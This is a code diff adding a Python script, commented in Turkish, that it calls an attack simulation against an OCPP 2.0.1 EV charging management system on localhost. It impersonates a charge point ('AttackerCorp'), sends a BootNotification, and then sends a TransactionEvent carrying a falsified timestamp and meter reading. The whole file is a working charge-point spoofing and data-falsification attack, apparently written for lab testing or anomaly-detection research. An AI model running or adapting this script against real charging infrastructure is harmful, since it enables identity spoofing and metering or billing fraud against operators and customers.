@@ -1,0 +1,190 @@
+
+import asyncio
+import json
+import uuid
+import logging
+import websockets
+from ocpp.v201 import ChargePoint as cp
+from ocpp.v201 import call
+from ocpp.v201.enums import ReasonEnumType, TriggerReasonEnumType, TransactionEventEnumType
+from ocpp.v201.datatypes import ChargingStationType
+
+# ZAMAN ANOMALİSİ için sahte zaman damgası
+ANOMALY_TIMESTAMP = "2025-11-10T00:00:00Z"
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | [SALDIRI] | %(message)s")
+
+# ============================================================
+# ENUM DÜZELTME: Güvenli şekilde ReasonEnumType değerini bul
+# ============================================================
+def _resolve_reason_enum(reason_enum_class, preferred_names=None):
+    try:
+        available = [member.name for member in reason_enum_class]
+    except Exception:
+        available = []
+    logging.debug(f"ReasonEnumType üyeleri: {available}")
+
+    if preferred_names is None:
+        preferred_names = [
+            "REMOTE_START",
+            "RemoteStart",
+            "Remote_Start",
+            "REMOTE-START",
+            "REMOTESTART",
+            "remote_start"
+        ]
+
+    for name in preferred_names:
+        if hasattr(reason_enum_class, name):
+            return getattr(reason_enum_class, name).value
+
+    def norm(s):
+        return s.replace("_", "").replace("-", "").lower()
+
+    pref_norms = [norm(n) for n in preferred_names]
+    for member in getattr(reason_enum_class, "__members__", {}).values():
+        if norm(member.name) in pref_norms:
+            return member.value
+
+    # Fallback: İlk mevcut değeri döndür
+    try:
+        first_member = list(reason_enum_class)[0]
+        return first_member.value
+    except:
+        return None
+
+# ============================================================
+# TRANSACTION EVENT MESAJI (ZAMAN & KONUM ANOMALİSİ)
+# ============================================================
+def create_transaction_event_request(event_type, meter_value):
+    """Konum ve Zaman anomalisi içeren TransactionEvent komutunu oluşturur."""
+
+    message_id = str(uuid.uuid4())
+
+    trigger_reason_value = _resolve_reason_enum(TriggerReasonEnumType)
+    if trigger_reason_value is None:
+        logging.warning("TriggerReasonEnumType içinde uygun üye bulunamadı — fallback string kullanılıyor.")
+        trigger_reason_value = "RemoteStart"
+
+    payload = {
+        "eventType": event_type,
+        "timestamp": ANOMALY_TIMESTAMP,  # <-- ZAMAN ANOMALİSİ
+        "triggerReason": trigger_reason_value,
+        "seqNo": 1,
+        "transactionInfo": {
+            "transactionId": "TX-12345",
+            "chargingState": "Charging",
+        },
+        "meterValue": [
+            {
+                "timestamp": ANOMALY_TIMESTAMP,
+                "sampledValue": [
+                    {
+                        "value": str(meter_value),
+                        "measurand": "Energy.Active.Import.Register",
+                        "unitOfMeasure": {"unit": "Wh"},
+                    }
+                ],
+            }
+        ],
+        "evse": {"id": 1, "connectorId": 1},
+    }
+
+    return [2, message_id, "TransactionEvent", payload]
+
+# ============================================================
+# SALDIRI SİMÜLASYONU BAŞLANGICI
+# ============================================================
+async def attack_simulation():
+    url = "ws://127.0.0.1:9000/CP_TEST"
+    cp_id = "CP_TEST"
+
+    logging.info("============================================================")
+    logging.info("🎯 Saldırı hedefi: %s", url)
+    logging.info("🎭 Taklit edilen CP ID: %s", cp_id)
+    logging.info("============================================================")
+    logging.info("📡 CSMS'e bağlanılıyor...")
+
+    try:
+        async with websockets.connect(url, subprotocols=["ocpp2.0.1"]) as ws:
+            logging.info("✅ WebSocket bağlantısı kuruldu. Kimlik sahteciliği başarılı.")
+
+            # BootNotification gönder (OCPP 2.0.1 formatına uygun)
+            message_id = str(uuid.uuid4())
+
+            # ChargingStation objesi oluştur
+            charging_station = {
+                "model": "FakeModelX",
+                "vendorName": "AttackerCorp"  # vendor_name yerine vendorName
+            }
+
+            # OCPP 2.0.1 mesaj formatı: [MessageTypeId, MessageId, Action, Payload]
+            boot_msg = [
+                2,  # CALL
+                message_id,
+                "BootNotification",
+                {
+                    "chargingStation": charging_station,  # charging_station yerine chargingStation
+                    "reason": "PowerUp"
+                }
+            ]
+
+            await ws.send(json.dumps(boot_msg))
+            logging.info("📤 BootNotification gönderildi: %s", json.dumps(boot_msg, indent=2))
+
+            response = await ws.recv()
+            logging.info("📥 Parse edilmiş yanıt: %s", response)
+
+            # Yanıtı kontrol et
+            resp_data = json.loads(response)
+            if len(resp_data) >= 3 and resp_data[0] == 3:  # CallResult
+                logging.info("✅ BootNotification cevabı alındı. Kayıt durumu: %s",
+                           resp_data[2].get('status', 'Unknown'))
+            elif resp_data[0] == 4:  # CallError
+                logging.error("❌ BootNotification hatası: %s - %s", resp_data[2], resp_data[3])
+                return  # Hata durumunda devam etme
+            else:
+                logging.warning("⚠️ Beklenmeyen yanıt formatı")
+
+            # TransactionEvent için doğru enum değerini bul
+            try:
+                # TransactionEventEnumType içindeki mevcut değerleri listele
+                available_events = [member.name for member in TransactionEventEnumType]
+                logging.info("📋 Mevcut TransactionEvent tipleri: %s", available_events)
+
+                # Ended, Updated, Started gibi değerleri dene
+                event_type = None
+                for attempt in ["Ended", "Updated", "Started", "ENDED", "UPDATED", "STARTED"]:
+                    if hasattr(TransactionEventEnumType, attempt):
+                        event_type = getattr(TransactionEventEnumType, attempt).value
+                        logging.info("✅ Event type bulundu: %s", attempt)
+                        break
+
+                if event_type is None:
+                    # İlk mevcut değeri kullan
+                    event_type = list(TransactionEventEnumType)[0].value
+                    logging.warning("⚠️ Varsayılan event type kullanılıyor: %s", event_type)
+
+            except Exception as e:
+                logging.error("❌ TransactionEventEnumType hatası: %s", e)
+                event_type = "Ended"  # String fallback
+
+            # TransactionEvent (anomalili)
+            transaction_event_msg = create_transaction_event_request(event_type, 12345)
+
+            await ws.send(json.dumps(transaction_event_msg))
+            logging.info("📤 TransactionEvent (Anomali) gönderildi.")
+
+            recv_msg = await ws.recv()
+            logging.info("📥 CSMS yanıtı: %s", recv_msg)
+
+    except websockets.exceptions.WebSocketException as e:
+        logging.error("❌ WebSocket bağlantı hatası: %s", e)
+    except Exception as e:
+        logging.error("❌ Genel Hata: %s", e, exc_info=True)
+
+# ============================================================
+# ANA ÇALIŞTIRMA BLOĞU
+# ============================================================
+if __name__ == "__main__":
+    asyncio.run(attack_simulation())
